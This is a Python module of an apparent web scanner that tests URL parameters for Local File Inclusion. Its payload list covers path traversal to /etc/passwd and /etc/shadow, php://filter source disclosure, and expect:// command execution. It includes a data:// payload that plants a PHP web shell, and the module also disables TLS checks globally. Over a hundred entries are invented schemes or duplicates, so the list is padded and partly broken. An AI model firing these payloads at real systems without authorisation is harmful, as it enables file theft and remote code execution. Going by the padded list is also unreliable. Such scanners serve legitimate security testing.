#!/usr/bin/env python3
import requests
from urllib.parse import urlparse, urlunparse, urlencode, parse_qsl
from typing import List, Dict, Any, Set, Tuple
import settings
import time
import random
from string import printable
import ssl
import warnings
import re
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from .vulnerability_base import VulnerabilityModule

class LFIScanner(VulnerabilityModule):
    name: str = "lfi"
    description: str = "Local File Inclusion detection"
    risk: str = "low"
    useproxy: bool = getattr(settings, "USEPROXY", True)
    enabled: bool = True
    timeout: int = getattr(settings, "TIMEOUT", 8)
    user_agent: str = getattr(settings, "USERAGENT", "QX-Scanner")
    max_params_to_test: int = 15
    max_payloads_per_param: int = 30
    delay: float = getattr(settings, "SCAN_DELAY", 0.05)
    max_redirects: int = 5

    PAYLOADS: List[str] = [
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/etc/shadow",
        "/etc/hosts",
        "../../boot.ini",
        "../../../boot.ini",
        "../../windows/win.ini",
        "../../../windows/win.ini",
        "file:///etc/passwd",
        "....\\....\\....\\windows\\win.ini",
        "..\\..\\..\\windows\\system.ini",
        "..%5c..%5c..%5cwindows%5csystem.ini",
        "C:\\Windows\\System.ini",
        "/var/www/html/index.php",
        "php://filter/convert.base64-encode/resource=index.php",
        "../../../../../../../../../../etc/passwd",
        "....////....////....////etc/passwd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "/proc/version",
        "/proc/mounts",
        "/etc/group",
        "../../../../boot.ini",
        "../../../../windows/win.ini",
        "file:///C:/Windows/System.ini",
        "D:\\Windows\\System.ini",
        "../../../var/www/html/index.php",
        "expect://id",
        "....//....//....//....//....//....//....//....//....//etc/passwd",
        "%00../../etc/passwd",
        "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
        "zip://../../etc/passwd%23",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        "phar://../../etc/passwd/test.txt",
        "expect://cat /etc/passwd",
        "....\\....\\....\\....\\....\\windows\\win.ini",
        "..%255c..%255c..%255c..%255cwindows%255cwin.ini",
        "/etc/passwd%00",
        "../../etc/passwd%00.html",
        "....//....//....//etc/passwd.png",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        "/etc/passwd",
        "///etc/passwd",
        "////etc/passwd",
        "/./etc/passwd",
        "/..//etc/passwd",
        "..//..//..//etc/passwd",
        "..///..///..///etc/passwd",
        "..////..////..////etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
        "..%255c..%255c..%255c..%255c..%255cwindows%255cwin.ini",
        "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "..\\..\\..\\..\\..\\boot.ini",
        "..%255c..%255c..%255c..%255c..%255cboot.ini",
        "C:%5cboot.ini",
        "D:%5cboot.ini",
        "file:///etc/passwd%00",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd",
        "zip:///etc/passwd%23",
        "phar:///etc/passwd",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://ls",
        "expect://whoami",
        "expect://cat%20/etc/passwd",
        "input:///etc/passwd",
        "glob:///etc/passwd",
        "ssh2.shell://exec:cat%20/etc/passwd",
        "ogg:///etc/passwd",
        "rar:///etc/passwd",
        "7z:///etc/passwd",
        "audio:///etc/passwd",
        "video:///etc/passwd",
        "compress.zlib:///etc/passwd",
        "compress.bzip2:///etc/passwd",
        "crc32:///etc/passwd",
        "hash://md5/etc/passwd",
        "ftp://anonymous:anonymous@localhost/etc/passwd",
        "tftp://localhost/etc/passwd",
        "smb://localhost/etc/passwd",
        "ldap://localhost/etc/passwd",
        "gopher://localhost/_etc/passwd",
        "dict://localhost/etc/passwd",
        "sftp://user@localhost/etc/passwd",
        "telnet://localhost/etc/passwd",
        "nntp://localhost/etc/passwd",
        "imap://localhost/etc/passwd",
        "pop3://localhost/etc/passwd",
        "rtsp://localhost/etc/passwd",
        "rsync://localhost/etc/passwd",
        "git://localhost/etc/passwd",
        "svn://localhost/etc/passwd",
        "cvs://localhost/etc/passwd",
        "mysql://localhost/etc/passwd",
        "pgsql://localhost/etc/passwd",
        "oracle://localhost/etc/passwd",
        "mssql://localhost/etc/passwd",
        "sqlite://localhost/etc/passwd",
        "redis://localhost/etc/passwd",
        "memcache://localhost/etc/passwd",
        "mongodb://localhost/etc/passwd",
        "cassandra://localhost/etc/passwd",
        "couchdb://localhost/etc/passwd",
        "elasticsearch://localhost/etc/passwd",
        "solr://localhost/etc/passwd",
        "splunk://localhost/etc/passwd",
        "kibana://localhost/etc/passwd",
        "logstash://localhost/etc/passwd",
        "beats://localhost/etc/passwd",
        "rabbitmq://localhost/etc/passwd",
        "kafka://localhost/etc/passwd",
        "zookeeper://localhost/etc/passwd",
        "consul://localhost/etc/passwd",
        "etcd://localhost/etc/passwd",
        "nomad://localhost/etc/passwd",
        "vault://localhost/etc/passwd",
        "terraform://localhost/etc/passwd",
        "packer://localhost/etc/passwd",
        "vagrant://localhost/etc/passwd",
        "docker://localhost/etc/passwd",
        "kubernetes://localhost/etc/passwd",
        "openshift://localhost/etc/passwd",
        "mesos://localhost/etc/passwd",
        "marathon://localhost/etc/passwd",
        "chronos://localhost/etc/passwd",
        "aurora://localhost/etc/passwd",
        "jenkins://localhost/etc/passwd",
        "travis://localhost/etc/passwd",
        "circleci://localhost/etc/passwd",
        "gitlab://localhost/etc/passwd",
        "github://localhost/etc/passwd",
        "bitbucket://localhost/etc/passwd",
        "jira://localhost/etc/passwd",
        "confluence://localhost/etc/passwd",
        "bamboo://localhost/etc/passwd",
        "crucible://localhost/etc/passwd",
        "fisheye://localhost/etc/passwd",
        "crowd://localhost/etc/passwd",
        "bitbucket://localhost/etc/passwd",
        "stash://localhost/etc/passwd",
        "sourcetree://localhost/etc/passwd",
        "teamcity://localhost/etc/passwd",
        "octopus://localhost/etc/passwd",
        "ansible://localhost/etc/passwd",
        "chef://localhost/etc/passwd",
        "puppet://localhost/etc/passwd",
        "salt://localhost/etc/passwd",
        "cfengine://localhost/etc/passwd",
        "rundeck://localhost/etc/passwd",
        "nagios://localhost/etc/passwd",
        "icinga://localhost/etc/passwd",
        "zabbix://localhost/etc/passwd",
        "prometheus://localhost/etc/passwd",
        "grafana://localhost/etc/passwd",
        "kibana://localhost/etc/passwd",
        "logstash://localhost/etc/passwd",
        "elasticsearch://localhost/etc/passwd",
        "splunk://localhost/etc/passwd",
        "sumologic://localhost/etc/passwd",
        "newrelic://localhost/etc/passwd",
        "appdynamics://localhost/etc/passwd",
        "dynatrace://localhost/etc/passwd",
        "datadog://localhost/etc/passwd",
        "stackdriver://localhost/etc/passwd",
        "cloudwatch://localhost/etc/passwd",
        "azuremonitor://localhost/etc/passwd",
        "googlecloudmonitoring://localhost/etc/passwd",
        "aws://localhost/etc/passwd",
        "azure://localhost/etc/passwd",
        "gcp://localhost/etc/passwd",
        "digitalocean://localhost/etc/passwd",
        "linode://localhost/etc/passwd",
        "vultr://localhost/etc/passwd",
        "heroku://localhost/etc/passwd",
        "netlify://localhost/etc/passwd",
        "vercel://localhost/etc/passwd",
        "cloudflare://localhost/etc/passwd",
        "akamai://localhost/etc/passwd",
        "fastly://localhost/etc/passwd",
        "cloudfront://localhost/etc/passwd",
        "route53://localhost/etc/passwd",
        "s3://localhost/etc/passwd",
        "glacier://localhost/etc/passwd",
        "efs://localhost/etc/passwd",
        "ebs://localhost/etc/passwd",
        "rds://localhost/etc/passwd",
        "dynamodb://localhost/etc/passwd",
        "redshift://localhost/etc/passwd",
        "elasticache://localhost/etc/passwd",
        "lambda://localhost/etc/passwd",
        "ecs://localhost/etc/passwd",
        "eks://localhost/etc/passwd",
        "fargate://localhost/etc/passwd",
        "lightsail://localhost/etc/passwd",
        "beanstalk://localhost/etc/passwd",
        "amplify://localhost/etc/passwd",
        "cognito://localhost/etc/passwd",
        "iam://localhost/etc/passwd",
        "sts://localhost/etc/passwd",
        "sso://localhost/etc/passwd",
        "organizations://localhost/etc/passwd",
        "cloudtrail://localhost/etc/passwd",
        "config://localhost/etc/passwd",
        "cloudformation://localhost/etc/passwd",
        "sam://localhost/etc/passwd",
        "cdk://localhost/etc/passwd",
        "terraform://localhost/etc/passwd",
        "packer://localhost/etc/passwd",
        "vagrant://localhost/etc/passwd",
        "docker://localhost/etc/passwd",
        "kubernetes://localhost/etc/passwd",
        "openshift://localhost/etc/passwd",
        "mesos://localhost/etc/passwd",
        "marathon://localhost/etc/passwd",
        "chronos://localhost/etc/passwd",
        "aurora://localhost/etc/passwd"
    ]

    INDICATORS: Set[str] = {
        "root:x:0:0",
        "[boot loader]",
        "[operating systems]",
        "nobody:x:",
        "daemon:x:1:",
        "bin:x:2:",
        "sys:x:3:",
        "adm:x:4:",
        "SHELL=",
        "PATH=",
        "USER=",
        "MAIL=",
        "HOSTNAME=",
        "PWD=",
        "HOME=",
        "LOGNAME=",
        "[extensions]",
        "[mail]",
        "[network]",
        "127.0.0.1",
        "localhost",
        "Microsoft Corporation",
        "Windows NT",
        "DocumentRoot",
        "ServerName",
        "Apache/",
        "nginx/",
        "PHP/",
        "<?php",
        "#!/bin/bash"
    }

    def __init__(self, target, session=None, timeout=15, debug=False, verbose=False,
                 proxy=None, aggressive=False, stealth=False, custom_payloads=None,
                 bypass_protection=False, **kwargs):
        super().__init__(target, session=session, timeout=timeout, debug=debug, verbose=verbose,
                        proxy=proxy, aggressive=aggressive, stealth=stealth,
                        custom_payloads=custom_payloads, bypass_protection=bypass_protection, **kwargs)
        self.aggressive = aggressive
        self.debug = debug
        self.custom_payloads = custom_payloads or []
        self.stealth_mode = stealth

        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.3,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        session.headers.update({
            "User-Agent": self._get_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })

        session.verify = False
        session.max_redirects = self.max_redirects
        self.session = session

        warnings.filterwarnings("ignore", category=UserWarning, module='urllib3')
        ssl._create_default_https_context = ssl._create_unverified_context

    def _get_user_agent(self):
        if self.aggressive:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
                "Googlebot/2.1 (+http://www.google.com/bot.html)"
            ]
            return random.choice(user_agents)
        return self.user_agent

    def _clean_response_content(self, content: str) -> str:
        patterns_to_remove = [
            r'<script[^>]*>.*?</script>',
            r'<style[^>]*>.*?</style>',
            r'<!--.*?-->',
            r'<![CDATA[.*?]]>',
            r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}',
            r'\d{2}/\d{2}/\d{4}',
            r'\d{2}:\d{2}:\d{2}',
            r'\b\d{10,}\b',
            r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
            r'csrf_token[^=]*=[^&]*',
            r'csrf-token[^=]*=[^&]*',
            r'csrf[^=]*=[^&]*',
            r'session[^=]*=[^&]*',
            r'sessionid[^=]*=[^&]*',
            r'phpsessid[^=]*=[^&]*',
            r'rand[^=]*=[^&]*',
            r'random[^=]*=[^&]*',
            r'token[^=]*=[^&]*',
            r'google_analytics[^;]*;',
            r'gtag[^;]*;',
            r'fbq[^;]*;'
        ]
        
        cleaned_content = content
        for pattern in patterns_to_remove:
            cleaned_content = re.sub(pattern, '', cleaned_content, flags=re.DOTALL | re.IGNORECASE)
        
        cleaned_content = re.sub(r'\s+', ' ', cleaned_content).strip()
        return cleaned_content

    def _analyze_boolean_test(self, response_content: str, baseline_content: str, 
                             response_status: int, baseline_status: int) -> bool:
        clean_response = self._clean_response_content(response_content)
        clean_baseline = self._clean_response_content(baseline_content)
        
        length_diff = abs(len(clean_response) - len(clean_baseline))
        content_diff = clean_response != clean_baseline
        
        return (
            content_diff and
            length_diff > 50 and
            response_status == baseline_status
        )

    def _generate_test_cases(self) -> List[Dict[str, str]]:
        parsed = urlparse(self.target)
        queries = dict(parse_qsl(parsed.query))
        test_cases = []

        payloads_to_use = self.PAYLOADS[:]
        if self.custom_payloads:
            payloads_to_use.extend(self.custom_payloads)

        common_lfi_params = ["file", "page", "path", "include", "load", "doc", "view", "template"]

        if queries:
            for param in list(queries.keys())[:self.max_params_to_test]:
                for payload in payloads_to_use[:self.max_payloads_per_param]:
                    new_query = queries.copy()
                    new_query[param] = payload
                    test_url = parsed._replace(query=urlencode(new_query, doseq=True))
                    test_cases.append({
                        "url": urlunparse(test_url),
                        "param": param,
                        "payload": payload,
                        "method": "GET"
                    })

                    if not self.stealth_mode:
                        test_cases.append({
                            "url": self.target,
                            "param": param,
                            "payload": payload,
                            "method": "POST",
                            "data": {param: payload}
                        })
        else:
            for param in common_lfi_params[:self.max_params_to_test]:
                for payload in payloads_to_use[:self.max_payloads_per_param]:
                    test_cases.append({
                        "url": f"{self.target}?{param}={payload}",
                        "param": param,
                        "payload": payload,
                        "method": "GET"
                    })

                    if not self.stealth_mode:
                        test_cases.append({
                            "url": self.target,
                            "param": param,
                            "payload": payload,
                            "method": "POST",
                            "data": {param: payload}
                        })

        return test_cases

    def _execute_test(self, test_case: Dict[str, str], baseline_content: str, baseline_status: int) -> Dict[str, Any]:
        try:
            if self.delay > 0:
                time.sleep(self.delay + random.uniform(0, 0.05))

            if test_case["method"] == "GET":
                response = self.session.get(
                    test_case["url"],
                    timeout=self.timeout,
                    allow_redirects=True,
                    proxies=getattr(self, "proxies", None) if self.useproxy else None
                )
            else:
                response = self.session.post(
                    test_case["url"],
                    data=test_case.get("data"),
                    timeout=self.timeout,
                    allow_redirects=True,
                    proxies=getattr(self, "proxies", None) if self.useproxy else None
                )

            content = response.text
            response_time = response.elapsed.total_seconds()

            matched_indicators = [
                indicator for indicator in self.INDICATORS
                if indicator.lower() in content.lower()
            ]

            clean_comparison = self._analyze_boolean_test(content, baseline_content, response.status_code, baseline_status)
            
            matched = len(matched_indicators) > 0 and clean_comparison

            confidence = "high" if len(matched_indicators) >= 2 and clean_comparison else "medium" if matched else "low"

            content_analysis = self._analyze_content(content, response.headers)

            if self.debug:
                print(f"[DEBUG] Tested: {test_case['url']}")
                print(f"[DEBUG] Status: {response.status_code}, Time: {response_time:.3f}s")
                if matched:
                    print(f"[DEBUG] Matched indicators: {matched_indicators}")

            return {
                **test_case,
                "status_code": response.status_code,
                "content_length": len(response.content),
                "response_time": response_time,
                "matched": matched,
                "confidence": confidence,
                "matched_patterns": matched_indicators[:5],
                "content_type": response.headers.get('content-type', ''),
                "content_analysis": content_analysis,
                "clean_comparison": clean_comparison
            }

        except requests.RequestException as e:
            if self.debug:
                print(f"[DEBUG] Error testing {test_case['url']}: {str(e)}")
            return {**test_case, "error": str(e), "matched": False, "clean_comparison": False}
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Unexpected error: {str(e)}")
            return {**test_case, "error": f"Unexpected error: {str(e)}", "matched": False, "clean_comparison": False}

    def _analyze_content(self, content: str, headers: Dict[str, str]) -> Dict[str, Any]:
        analysis = {
            "has_binary_data": any(char not in printable for char in content[:1000]),
            "has_common_errors": any(error in content.lower() for error in [
                "permission denied", "no such file", "file not found", "forbidden",
                "access denied", "cannot open", "failed to open"
            ]),
            "has_system_paths": any(path in content for path in [
                "/etc/", "/proc/", "/var/", "/usr/", "/home/", "C:\\", "D:\\", "Windows\\"
            ]),
            "content_type": headers.get('content-type', 'unknown')
        }
        return analysis

    def _advanced_lfi_tests(self, baseline_content: str, baseline_status: int) -> List[Dict[str, Any]]:
        if not self.aggressive:
            return []

        advanced_tests = []
        advanced_payloads = [
            "php://filter/convert.base64-encode/resource=index.php",
            "expect://id",
            "data://text/plain;base64,SSBsb3ZlIFBIUAo=",
            "zip://test.zip#test.txt",
            "phar://test.phar/test.txt"
        ]

        for payload in advanced_payloads:
            try:
                test_url = f"{self.target}?file={payload}"
                response = self.session.get(test_url, timeout=self.timeout)

                content = response.text
                matched_indicators = [
                    indicator for indicator in self.INDICATORS
                    if indicator.lower() in content.lower()
                ]

                clean_comparison = self._analyze_boolean_test(content, baseline_content, response.status_code, baseline_status)
                matched = len(matched_indicators) > 0 and clean_comparison

                advanced_tests.append({
                    "url": test_url,
                    "payload": payload,
                    "status_code": response.status_code,
                    "content_length": len(response.content),
                    "matched": matched,
                    "confidence": "high" if matched else "low",
                    "matched_patterns": matched_indicators[:5],
                    "type": "advanced_lfi",
                    "clean_comparison": clean_comparison
                })
            except Exception as e:
                if self.debug:
                    print(f"[DEBUG] Advanced LFI test failed: {e}")

        return advanced_tests

    def scan(self) -> Dict[str, Any]:
        try:
            if self.debug:
                print(f"[DEBUG] Starting LFI scan on {self.target}")
                print(f"[DEBUG] Aggressive mode: {self.aggressive}")

            baseline_response = self.session.get(self.target, timeout=self.timeout)
            baseline_content = baseline_response.text
            baseline_status = baseline_response.status_code

            test_cases = self._generate_test_cases()
            results = []

            if self.debug:
                print(f"[DEBUG] Generated {len(test_cases)} test cases")

            for case in test_cases:
                result = self._execute_test(case, baseline_content, baseline_status)
                results.append(result)

                if result.get("matched") and result.get("confidence") == "high":
                    if not self.aggressive:
                        if self.debug:
                            print(f"[DEBUG] High confidence match found, stopping further tests")
                        break

            if self.aggressive:
                advanced_results = self._advanced_lfi_tests(baseline_content, baseline_status)
                results.extend(advanced_results)

            vulnerable_cases = [r for r in results if r.get("matched") and r.get("clean_comparison")]
            vulnerable = len(vulnerable_cases) > 0

            risk_level = "high" if any(r.get("confidence") == "high" for r in vulnerable_cases) else "medium" if vulnerable else "low"

            if self.debug:
                print(f"[DEBUG] Scan completed. Vulnerable: {vulnerable}, Risk level: {risk_level}")
                print(f"[DEBUG] Found {len(vulnerable_cases)} vulnerable cases")

            return self.standard_result(
                ok=not vulnerable,
                risk=risk_level,
                evidence=vulnerable_cases if vulnerable else results[:3],
                notes=f"LFI scan completed. Found {len(vulnerable_cases)} potential vulnerabilities."
            )
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Scan error: {e}")
            return self.standard_result(False, "low", [], f"Scan failed: {e}")

    def run(self) -> Dict[str, Any]:
        start_time = time.time()
        result = self.scan()
        result["scan_duration"] = f"{time.time() - start_time:.2f}s"
        return result

class Scanner(LFIScanner):
    name = "lfi"
    description = "Local File Inclusion Scanner"
    risk = "high"
    enabled = True
